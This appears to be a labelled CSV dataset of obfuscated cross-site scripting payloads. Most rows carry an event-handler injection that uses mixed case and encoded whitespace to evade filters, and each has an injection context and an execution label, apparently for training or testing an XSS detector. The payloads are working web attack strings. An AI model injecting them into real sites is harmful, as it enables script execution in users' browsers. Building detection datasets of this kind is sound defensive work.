payload,context,exec,combined
<DeTAiLS%0aONPoiNTErentER%0a=%0a[8].find(confirm)>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <DeTAiLS%0aONPoiNTErentER%0a=%0a[8].find(confirm)>
"<D3v%09oNPOinTEREnTER%0d=%0da=prompt,a()>v3dm0s",html_text,1,"CTX_html_text CTX_html_text CTX_html_text <D3v%09oNPOinTEREnTER%0d=%0da=prompt,a()>v3dm0s"
<D3V/+/ONPoinTerenTEr%09=%09confirm()%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <D3V/+/ONPoinTerenTEr%09=%09confirm()%0dx>v3dm0s
<html%0aoNmoUSeOVer%0a=%0aconfirm()//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <html%0aoNmoUSeOVer%0a=%0aconfirm()//
<A%09onpointEREnTer%0d=%0dconfirm()%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <A%09onpointEREnTer%0d=%0dconfirm()%0dx>v3dm0s
<a%0aONMouseOVEr%0d=%0dconfirm()%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <a%0aONMouseOVEr%0d=%0dconfirm()%0dx>v3dm0s
<htML/+/OnmOUSEOVer%09=%09confirm()>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <htML/+/OnmOUSEOVer%09=%09confirm()>
<HtMl/+/oNPoinTerEnteR%0d=%0dconfirm()%0dx>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <HtMl/+/oNPoinTerEnteR%0d=%0dconfirm()%0dx>
"<dEtAils%09onPoINtEREnTer%0d=%0da=prompt,a()//",html_tag,0,"CTX_html_tag CTX_html_tag CTX_html_tag <dEtAils%09onPoINtEREnTer%0d=%0da=prompt,a()//"
<d3V%0dOnPOIntEREntER%0d=%0dconfirm()>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <d3V%0dOnPOIntEREntER%0d=%0dconfirm()>v3dm0s
"<hTML/+/oNMOuSeoveR%09=%09a=prompt,a()//",html_tag,0,"CTX_html_tag CTX_html_tag CTX_html_tag <hTML/+/oNMOuSeoveR%09=%09a=prompt,a()//"
<A%0doNMOUsEOVEr%0d=%0d(prompt)``>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <A%0doNMOUsEOVEr%0d=%0d(prompt)``>v3dm0s
<D3v%0aoNmOUsEOver%0a=%0aconfirm()%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <D3v%0aoNmOUsEOver%0a=%0aconfirm()%0dx>v3dm0s
<svg><script>prompt(1)</script>,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <svg><script>prompt(1)</script>
"<D3V%09OnmoUseOVer%0a=%0aa=prompt,a()%0dx>v3dm0s",html_tag,1,"CTX_html_tag CTX_html_tag CTX_html_tag <D3V%09OnmoUseOVer%0a=%0aa=prompt,a()%0dx>v3dm0s"
<a%0donPoinTErenTEr%0d=%0d(confirm)()>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <a%0donPoinTErenTEr%0d=%0d(confirm)()>v3dm0s
<d3V/+/OnpOInTerENtER%0a=%0a(confirm)()>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <d3V/+/OnpOInTerENtER%0a=%0a(confirm)()>v3dm0s
"<deTAIls%09ONpoINTEREnTER+=+a=prompt,a()%0dx>",html_text,0,"CTX_html_text CTX_html_text CTX_html_text <deTAIls%09ONpoINTEREnTER+=+a=prompt,a()%0dx>"
<htmL%0aonMouSEOVer%0a=%0a(confirm)()>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <htmL%0aonMouSEOVer%0a=%0a(confirm)()>
<HTmL%0aOnPOinTERENTeR%0d=%0d(prompt)``//,html_text,0,CTX_html_text CTX_html_text CTX_html_text <HTmL%0aOnPOinTERENTeR%0d=%0d(prompt)``//
<d3V/+/OnpOiNteRENter%09=%09(confirm)()%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <d3V/+/OnpOiNteRENter%09=%09(confirm)()%0dx>v3dm0s
<D3v%0aOnpoiNTerENTer%0d=%0d(confirm)()%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <D3v%0aOnpoiNTerENTer%0d=%0d(confirm)()%0dx>v3dm0s
"<HTMl%0dOnpoiNTErenTeR%0d=%0da=prompt,a()//",html_tag,0,"CTX_html_tag CTX_html_tag CTX_html_tag <HTMl%0dOnpoiNTErenTeR%0d=%0da=prompt,a()//"
<A%09oNPoinTERenteR%09=%09confirm()>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <A%09oNPoinTERenteR%09=%09confirm()>v3dm0s
<a%09oNpoINteRenTEr+=+confirm()%0dx>v3dm0s,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <a%09oNpoINteRenTEr+=+confirm()%0dx>v3dm0s
<d3v%0dONMouSEOVEr%0d=%0d(confirm)()>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <d3v%0dONMouSEOVEr%0d=%0d(confirm)()>v3dm0s
<D3V/+/ONPoInteRenTer%0a=%0aconfirm()%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <D3V/+/ONPoInteRenTer%0a=%0aconfirm()%0dx>v3dm0s
"<d3V%0doNmousEOVEr%0a=%0aa=prompt,a()%0dx>v3dm0s",html_tag,1,"CTX_html_tag CTX_html_tag CTX_html_tag <d3V%0doNmousEOVEr%0a=%0aa=prompt,a()%0dx>v3dm0s"
<D3v%0dONPoInTeRENtEr+=+confirm()%0dx>v3dm0s,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <D3v%0dONPoInTeRENtEr+=+confirm()%0dx>v3dm0s
<a/+/OnPoiNterENTeR%09=%09confirm()>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <a/+/OnPoiNterENTeR%09=%09confirm()>v3dm0s
</pre><details open ontoggle=alert(1)>,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag </pre><details open ontoggle=alert(1)>
<a/+/OnpoinTeREnTer%0d=%0dconfirm()%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <a/+/OnpoinTeREnTer%0d=%0dconfirm()%0dx>v3dm0s
<detAILs%0doNpoInTErENtER+=+confirm()%0dx>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <detAILs%0doNpoInTErENtER+=+confirm()%0dx>
<htmL%0aONMOuSeoVeR%0a=%0aconfirm()%0dx//,html_text,0,CTX_html_text CTX_html_text CTX_html_text <htmL%0aONMOuSeoVeR%0a=%0aconfirm()%0dx//
<a%09OnMoUSeOver%0a=%0a(prompt)``>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <a%09OnMoUSeOver%0a=%0a(prompt)``>v3dm0s
<D3V%0aOnMOuSeOVEr%09=%09(confirm)()%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <D3V%0aOnMOuSeOVEr%09=%09(confirm)()%0dx>v3dm0s
<a%0doNmOusEoVEr%0d=%0d[8].find(confirm)%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <a%0doNmOusEoVEr%0d=%0d[8].find(confirm)%0dx>v3dm0s
<D3v%0aOnmouseoVer%0d=%0dconfirm()%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <D3v%0aOnmouseoVer%0d=%0dconfirm()%0dx>v3dm0s
<D3v%0dONmoUsEoVER%0a=%0aconfirm()>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <D3v%0dONmoUsEoVER%0a=%0aconfirm()>v3dm0s
<D3v%0dONPoInTeRENtEr+=+confirm()%0dx>v3dm0s,html_text,0,CTX_html_text CTX_html_text CTX_html_text <D3v%0dONPoInTeRENtEr+=+confirm()%0dx>v3dm0s
<D3V/+/ONmousEOVeR%09=%09[8].find(confirm)%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <D3V/+/ONmousEOVeR%09=%09[8].find(confirm)%0dx>v3dm0s
<D3v%0aOnPoInTERenter%0d=%0d(prompt)``>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <D3v%0aOnPoInTERenter%0d=%0d(prompt)``>v3dm0s
<HtmL%0aonpoINTeREntER%09=%09[8].find(confirm)%0dx//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <HtmL%0aonpoINTeREntER%09=%09[8].find(confirm)%0dx//
"<D3V%0doNMoUSEOveR+=+a=prompt,a()>v3dm0s",html_tag,0,"CTX_html_tag CTX_html_tag CTX_html_tag <D3V%0doNMoUSEOveR+=+a=prompt,a()>v3dm0s"
"<dETAils%0dontOGGle%09=%09a=prompt,a()//",html_tag,0,"CTX_html_tag CTX_html_tag CTX_html_tag <dETAils%0dontOGGle%09=%09a=prompt,a()//"
<A%09ONmOUSEovER+=+confirm()>v3dm0s,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <A%09ONmOUSEovER+=+confirm()>v3dm0s
<a%09OnMoUSeOver%0a=%0a(prompt)``>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <a%09OnMoUSeOver%0a=%0a(prompt)``>v3dm0s
<D3v%0aONpOInTeREnTER%0a=%0a[8].find(confirm)%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <D3v%0aONpOInTeREnTER%0a=%0a[8].find(confirm)%0dx>v3dm0s
<A%0aOnPOInTErENteR%0d=%0d(prompt)``>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <A%0aOnPOInTErENteR%0d=%0d(prompt)``>v3dm0s
<a%0aONMOusEoVEr%0a=%0aconfirm()%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <a%0aONMOusEoVEr%0a=%0aconfirm()%0dx>v3dm0s
<A%09OnMOuSeover%09=%09(confirm)()%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <A%09OnMOuSeover%09=%09(confirm)()%0dx>v3dm0s
"<D3V%09OnmoUseOVer%0a=%0aa=prompt,a()%0dx>v3dm0s",html_text,1,"CTX_html_text CTX_html_text CTX_html_text <D3V%09OnmoUseOVer%0a=%0aa=prompt,a()%0dx>v3dm0s"
<D3V%09OnPoINTEREnteR%09=%09(confirm)()%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <D3V%09OnPoINTEREnteR%09=%09(confirm)()%0dx>v3dm0s
<HTmL%0doNPoinTErENtER%0d=%0dconfirm()%0dx>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <HTmL%0doNPoinTErENtER%0d=%0dconfirm()%0dx>
<DeTaILS%0dONpoIntERenter%09=%09(prompt)``%0dx>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <DeTaILS%0dONpoIntERenter%09=%09(prompt)``%0dx>
<A%0aOnMOUSeOver%09=%09(confirm)()%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <A%0aOnMOUSeOver%09=%09(confirm)()%0dx>v3dm0s
<D3v%09onPOintereNtER%0d=%0dconfirm()%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <D3v%09onPOintereNtER%0d=%0dconfirm()%0dx>v3dm0s
<deTAIlS%09oNTogGlE+=+confirm()//,html_text,0,CTX_html_text CTX_html_text CTX_html_text <deTAIlS%09oNTogGlE+=+confirm()//
<D3V%0aonmOuseOVeR%09=%09confirm()%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <D3V%0aonmOuseOVeR%09=%09confirm()%0dx>v3dm0s
<a%0aoNMousEoveR%0d=%0d[8].find(confirm)%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <a%0aoNMousEoveR%0d=%0d[8].find(confirm)%0dx>v3dm0s
<D3V%09OnPoINTEREnteR%09=%09(confirm)()%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <D3V%09OnPoINTEREnteR%09=%09(confirm)()%0dx>v3dm0s
<HtmL%09onpOIntEreNteR%09=%09(confirm)()//,html_text,0,CTX_html_text CTX_html_text CTX_html_text <HtmL%09onpOIntEreNteR%09=%09(confirm)()//
<D3V%0donmoUSeovEr%0d=%0d(prompt)``>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <D3V%0donmoUSeovEr%0d=%0d(prompt)``>v3dm0s
<d3V/+/OnpointerEnTer%0d=%0d(confirm)()>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <d3V/+/OnpointerEnTer%0d=%0d(confirm)()>v3dm0s
<D3V%09oNpoINteREnter%0a=%0aconfirm()>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <D3V%09oNpoINteREnter%0a=%0aconfirm()>v3dm0s
<HTmL%09ONpoinTerentEr+=+confirm()>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <HTmL%09ONpoinTerentEr+=+confirm()>
"<HtML/+/oNmoUseoVeR%09=%09a=prompt,a()>",html_text,0,"CTX_html_text CTX_html_text CTX_html_text <HtML/+/oNmoUseoVeR%09=%09a=prompt,a()>"
<hTMl%0aoNpointeREnter+=+[8].find(confirm)//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <hTMl%0aoNpointeREnter+=+[8].find(confirm)//
<d3v%09OnmoUseoVer%0d=%0dconfirm()%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <d3v%09OnmoUseoVer%0d=%0dconfirm()%0dx>v3dm0s
<A%0aONmOuseOvEr%0d=%0d(prompt)``>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <A%0aONmOuseOvEr%0d=%0d(prompt)``>v3dm0s
<D3V/+/ONpOiNterentER%09=%09confirm()>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <D3V/+/ONpOiNterentER%09=%09confirm()>v3dm0s
<hTmL/+/ONpoINTeRENTEr+=+(confirm)()%0dx>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <hTmL/+/ONpoINTeRENTEr+=+(confirm)()%0dx>
"<Html%09ONmousEoVEr+=+a=prompt,a()>",html_text,0,"CTX_html_text CTX_html_text CTX_html_text <Html%09ONmousEoVEr+=+a=prompt,a()>"
"data:text/html,<script>confirm(1)</script>",url_navigation,1,"CTX_url_navigation CTX_url_navigation CTX_url_navigation data:text/html,<script>confirm(1)</script>"
"<html%0donpOINteReNTEr%09=%09a=prompt,a()//",html_tag,0,"CTX_html_tag CTX_html_tag CTX_html_tag <html%0donpOINteReNTEr%09=%09a=prompt,a()//"
<D3v%0aOnPOinterentER%09=%09[8].find(confirm)%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <D3v%0aOnPOinterentER%09=%09[8].find(confirm)%0dx>v3dm0s
"<d3V%0doNmousEOVEr%0a=%0aa=prompt,a()%0dx>v3dm0s",html_text,1,"CTX_html_text CTX_html_text CTX_html_text <d3V%0doNmousEOVEr%0a=%0aa=prompt,a()%0dx>v3dm0s"
<A%0doNPoiNtereNTer+=+confirm()%0dx>v3dm0s,html_text,0,CTX_html_text CTX_html_text CTX_html_text <A%0doNPoiNtereNTer+=+confirm()%0dx>v3dm0s
<d3V%09OnpOiNTeRenTER%0a=%0a(prompt)``%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <d3V%09OnpOiNTeRenTER%0a=%0a(prompt)``%0dx>v3dm0s
<hTMl%09oNmOuseovER%09=%09confirm()//,html_text,0,CTX_html_text CTX_html_text CTX_html_text <hTMl%09oNmOuseovER%09=%09confirm()//
<d3v%0doNPoiNTeREnTER%0a=%0a[8].find(confirm)%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <d3v%0doNPoiNTeREnTER%0a=%0a[8].find(confirm)%0dx>v3dm0s
<deTAILS%0dOnPoiNtEReNTEr%0d=%0d(confirm)()%0dx>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <deTAILS%0dOnPoiNtEReNTEr%0d=%0d(confirm)()%0dx>
"<DetAILS%09oNtOgglE%09=%09a=prompt,a()%0dx>",html_tag,0,"CTX_html_tag CTX_html_tag CTX_html_tag <DetAILS%09oNtOgglE%09=%09a=prompt,a()%0dx>"
<a/+/OnPoiNterENTeR%09=%09confirm()>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <a/+/OnPoiNterENTeR%09=%09confirm()>v3dm0s
<A%09onpointEREnTer%0d=%0dconfirm()%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <A%09onpointEREnTer%0d=%0dconfirm()%0dx>v3dm0s
<D3v%0aOnpOInterEnTer%09=%09(confirm)()%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <D3v%0aOnpOInterEnTer%09=%09(confirm)()%0dx>v3dm0s
"<D3v%0doNpoINTerENteR%09=%09a=prompt,a()>v3dm0s",html_tag,1,"CTX_html_tag CTX_html_tag CTX_html_tag <D3v%0doNpoINTerENteR%09=%09a=prompt,a()>v3dm0s"
<a%09onPOInTerEnteR%09=%09(prompt)``%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <a%09onPOInTerEnteR%09=%09(prompt)``%0dx>v3dm0s
<d3v%0dONMOUSeOvER%0d=%0dconfirm()>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <d3v%0dONMOUSeOvER%0d=%0dconfirm()>v3dm0s
<a%09onpoiNTerENtEr%0d=%0dconfirm()%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <a%09onpoiNTerENtEr%0d=%0dconfirm()%0dx>v3dm0s
<detAiLS%0dONToGgLE%09=%09confirm()%0dx//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <detAiLS%0dONToGgLE%09=%09confirm()%0dx//
<DEtaiLs%09ONPOINTeRENTER+=+confirm()%0dx//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <DEtaiLs%09ONPOINTeRENTER+=+confirm()%0dx//
<HtMl%0aONpoInTERenTeR%0a=%0aconfirm()%0dx//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <HtMl%0aONpoInTERenTeR%0a=%0aconfirm()%0dx//
<hTmL/+/oNmouseoVer%09=%09[8].find(confirm)%0dx//,html_text,0,CTX_html_text CTX_html_text CTX_html_text <hTmL/+/oNmouseoVer%09=%09[8].find(confirm)%0dx//
<dETAiLS%0aoNtOggLE%0a=%0a[8].find(confirm)%0dx//,html_text,0,CTX_html_text CTX_html_text CTX_html_text <dETAiLS%0aoNtOggLE%0a=%0a[8].find(confirm)%0dx//
<hTml%09oNPoIntErenter+=+[8].find(confirm)%0dx>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <hTml%09oNPoIntErenter+=+[8].find(confirm)%0dx>
"<a%0aOnpoiNTerEnteR+=+a=prompt,a()>v3dm0s",html_tag,0,"CTX_html_tag CTX_html_tag CTX_html_tag <a%0aOnpoiNTerEnteR+=+a=prompt,a()>v3dm0s"
<D3v%0aonPoiNteREntEr+=+(confirm)()>v3dm0s,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <D3v%0aonPoiNteREntEr+=+(confirm)()>v3dm0s
<tag>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <tag>
<d3V/+/ONPoIntEREntER%09=%09confirm()%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <d3V/+/ONPoIntEREntER%09=%09confirm()%0dx>v3dm0s
<HTmL%0aOnPOinTERENTeR%0d=%0d(prompt)``//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <HTmL%0aOnPOinTERENTeR%0d=%0d(prompt)``//
"<d3v%09onMOUSEoveR%09=%09a=prompt,a()%0dx>v3dm0s",html_text,1,"CTX_html_text CTX_html_text CTX_html_text <d3v%09onMOUSEoveR%09=%09a=prompt,a()%0dx>v3dm0s"
<D3V%09onmOUSEOvEr%09=%09(prompt)``>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <D3V%09onmOUSEOvEr%09=%09(prompt)``>v3dm0s
<a/+/oNpOINTerenTER%0a=%0aconfirm()>v3dm0s,script_block,0,CTX_script_block CTX_script_block CTX_script_block <a/+/oNpOINTerenTER%0a=%0aconfirm()>v3dm0s
<d3V/+/ONmOUseOver%0a=%0aconfirm()%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <d3V/+/ONmOUseOver%0a=%0aconfirm()%0dx>v3dm0s
<A%0aOnPoIntEreNter%0d=%0dconfirm()>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <A%0aOnPoIntEreNter%0d=%0dconfirm()>v3dm0s
<a/+/OnMOUSeoVEr%0d=%0d(confirm)()>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <a/+/OnMOUSeoVEr%0d=%0d(confirm)()>v3dm0s
"<HTML/+/OnPOinTEREnTeR%09=%09a=prompt,a()>",html_tag,0,"CTX_html_tag CTX_html_tag CTX_html_tag <HTML/+/OnPOinTEREnTeR%09=%09a=prompt,a()>"
"<d3V/+/OnpointeReNtER%0d=%0da=prompt,a()%0dx>v3dm0s",html_tag,1,"CTX_html_tag CTX_html_tag CTX_html_tag <d3V/+/OnpointeReNtER%0d=%0da=prompt,a()%0dx>v3dm0s"
""" onmouseover=alert(1) """,html_attribute,1,"CTX_html_attribute CTX_html_attribute CTX_html_attribute "" onmouseover=alert(1) """
<HTMl%0aonmOUSEoVer+=+(prompt)``%0dx//,html_text,0,CTX_html_text CTX_html_text CTX_html_text <HTMl%0aonmOUSEoVer+=+(prompt)``%0dx//
"<D3V%0dOnmoUsEOvER%09=%09a=prompt,a()>v3dm0s",html_tag,1,"CTX_html_tag CTX_html_tag CTX_html_tag <D3V%0dOnmoUsEOvER%09=%09a=prompt,a()>v3dm0s"
<a%0doNMoUSeoVEr%09=%09(confirm)()>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <a%0doNMoUSeoVEr%09=%09(confirm)()>v3dm0s
<A%09onPOINTEReNtEr%0d=%0d(prompt)``%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <A%09onPOINTEReNtEr%0d=%0d(prompt)``%0dx>v3dm0s
<D3V%0dONPOiNTeREnteR%0d=%0d(prompt)``%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <D3V%0dONPOiNTeREnteR%0d=%0d(prompt)``%0dx>v3dm0s
"data:text/html,<script>confirm(1)</script>",html_tag,0,"CTX_html_tag CTX_html_tag CTX_html_tag data:text/html,<script>confirm(1)</script>"
<dETaILs/+/ontOgglE+=+(confirm)()>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <dETaILs/+/ontOgglE+=+(confirm)()>
<D3v%0doNmoUseOveR+=+confirm()%0dx>v3dm0s,html_text,0,CTX_html_text CTX_html_text CTX_html_text <D3v%0doNmoUseOveR+=+confirm()%0dx>v3dm0s
<d3v%0doNPoiNTeREnTER%0a=%0a[8].find(confirm)%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <d3v%0doNPoiNTeREnTER%0a=%0a[8].find(confirm)%0dx>v3dm0s
<deTAilS%09oNpOinteReNTeR%09=%09confirm()>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <deTAilS%09oNpOinteReNTeR%09=%09confirm()>
"<DETaiLS%0dONpoiNTErEntEr+=+a=prompt,a()%0dx//",html_tag,0,"CTX_html_tag CTX_html_tag CTX_html_tag <DETaiLS%0dONpoiNTErEntEr+=+a=prompt,a()%0dx//"
<d3V%0dONPoINteRENTer%0a=%0a(confirm)()%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <d3V%0dONPoINteRENTer%0a=%0a(confirm)()%0dx>v3dm0s
<hTmL%0aoNmouseoVER+=+(confirm)()>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <hTmL%0aoNmouseoVER+=+(confirm)()>
<a%0aonpoInTErEnTeR%0d=%0dconfirm()%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <a%0aonpoInTErEnTeR%0d=%0dconfirm()%0dx>v3dm0s
<a%09ONmOUSEOVeR%0a=%0a(prompt)``%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <a%09ONmOUSEOVeR%0a=%0a(prompt)``%0dx>v3dm0s
<a%0donpoInTERenTEr%0a=%0aconfirm()>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <a%0donpoInTERenTEr%0a=%0aconfirm()>v3dm0s
"<htmL%09OnPOIntErENteR%09=%09a=prompt,a()>",html_text,0,"CTX_html_text CTX_html_text CTX_html_text <htmL%09OnPOIntErENteR%09=%09a=prompt,a()>"
<D3V%0donmoUSEovEr%0a=%0a(prompt)``%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <D3V%0donmoUSEovEr%0a=%0a(prompt)``%0dx>v3dm0s
<dETaiLs%09onPoinTeRenTER%09=%09(prompt)``>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <dETaiLs%09onPoinTeRenTER%09=%09(prompt)``>
<A%0aonPoIntEreNTeR%0a=%0a(prompt)``%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <A%0aonPoIntEreNTeR%0a=%0a(prompt)``%0dx>v3dm0s
<D3V%0aOnMOuSeOVEr%09=%09(confirm)()%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <D3V%0aOnMOuSeOVEr%09=%09(confirm)()%0dx>v3dm0s
"<HTML%0doNmoUseOvER%0d=%0da=prompt,a()%0dx//",html_text,0,"CTX_html_text CTX_html_text CTX_html_text <HTML%0doNmoUseOvER%0d=%0da=prompt,a()%0dx//"
<DetaILs/+/oNTogGLe%0d=%0dconfirm()>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <DetaILs/+/oNTogGLe%0d=%0dconfirm()>
<HTmL%0dOnMOuSeoVer%0d=%0dconfirm()//,html_text,0,CTX_html_text CTX_html_text CTX_html_text <HTmL%0dOnMOuSeoVer%0d=%0dconfirm()//
<HTmL%09OnmouseovEr%0a=%0a[8].find(confirm)>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <HTmL%09OnmouseovEr%0a=%0a[8].find(confirm)>
<HTmL%0aonMoUSEoVEr%09=%09(prompt)``%0dx//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <HTmL%0aonMoUSEoVEr%09=%09(prompt)``%0dx//
<dETaILs/+/ontOgglE+=+(confirm)()>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <dETaILs/+/ontOgglE+=+(confirm)()>
<A%0dONmouseoveR%0a=%0a(confirm)()%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <A%0dONmouseoveR%0a=%0a(confirm)()%0dx>v3dm0s
"<D3V/+/oNmOUseOver+=+a=prompt,a()%0dx>v3dm0s",html_tag,0,"CTX_html_tag CTX_html_tag CTX_html_tag <D3V/+/oNmOUseOver+=+a=prompt,a()%0dx>v3dm0s"
<hTml%0doNMOUseOvEr%09=%09(prompt)``>,script_block,0,CTX_script_block CTX_script_block CTX_script_block <hTml%0doNMOUseOvEr%09=%09(prompt)``>
